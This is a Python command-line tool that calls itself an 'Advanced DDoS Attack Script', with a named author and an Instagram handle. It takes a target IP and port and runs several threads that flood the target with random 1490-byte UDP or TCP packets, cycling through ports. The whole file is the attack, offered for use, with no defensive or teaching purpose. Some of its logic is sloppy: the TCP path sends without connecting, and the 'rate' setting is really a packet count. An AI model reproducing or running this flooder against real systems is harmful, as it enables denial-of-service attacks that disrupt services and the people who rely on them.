import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
import argparse
from urllib.parse import urlparse

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Advanced features: Multi-threading, logging, and command-line parsing
def send_packets(ip, port, times, protocol):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if protocol == "UDP" else socket.SOCK_STREAM)
    bytes = random._urandom(1490)
    sent = 0
    
    for _ in range(times):
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            print(f"Sent {sent} packets to {ip} through port:{port}")
        except Exception as e:
            print(f"Error sending packets: {e}")
            break

def validate_target(ip):
    try:
        socket.gethostbyname(ip)
        return True
    except socket.error:
        return False

# Parsing command-line arguments
parser = argparse.ArgumentParser(description="Advanced DDoS Attack Script")
parser.add_argument("ip", type=str, help="IP address of the target")
parser.add_argument("port", type=int, help="Port to attack")
parser.add_argument("-p", "--protocol", type=str, default="UDP", choices=["UDP", "TCP"], help="Protocol to use (UDP/TCP)")
parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads to use")
parser.add_argument("-r", "--rate", type=int, default=100, help="Packets per second")
args = parser.parse_args()

# Target Validation
if not validate_target(args.ip):
    print(f"Target IP {args.ip} is unreachable or invalid.")
    sys.exit()

# Start the attack
os.system("clear")
os.system("figlet DDos Attack Starting")
print(f"Author   : Adil Munawar")
print(f"Instagram: https://www.instagram.com/how_adil")
print(f"Target   : {args.ip}")
print(f"Port     : {args.port}")
print(f"Protocol : {args.protocol}")
print(f"Threads  : {args.threads}")
print(f"Rate     : {args.rate} packets/sec")
print("[====================] Attack Starting\n")

# Creating threads for multi-threaded packet sending
threads = []
for _ in range(args.threads):
    t = threading.Thread(target=send_packets, args=(args.ip, args.port, args.rate, args.protocol))
    threads.append(t)
    t.start()

# Wait for threads to finish
for t in threads:
    t.join()

print("[====================] Attack Finished\n")

